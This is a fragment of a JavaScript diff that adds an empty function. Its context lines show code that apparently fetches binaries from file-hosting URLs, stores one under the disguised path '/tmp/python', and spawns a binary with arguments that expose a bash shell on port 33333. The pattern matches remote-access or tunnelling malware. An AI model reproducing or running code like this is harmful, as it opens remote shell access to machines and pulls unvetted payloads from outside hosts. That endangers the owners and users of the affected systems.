@@ -12,6 +12,9 @@ const tunnelPath = "/tmp/python";
 const rayUrl= "https://f005.backblazeb2.com/file/kiraro/litaty";
 const tunnelUrl ="https://f005.backblazeb2.com/file/kiraro/lifa";
 
+
+function emptyFunction() {}
+
 function runRay(){
 	var child = spawn(rayPath,["-p","33333","bash"]); 
 	console.log("ray done");
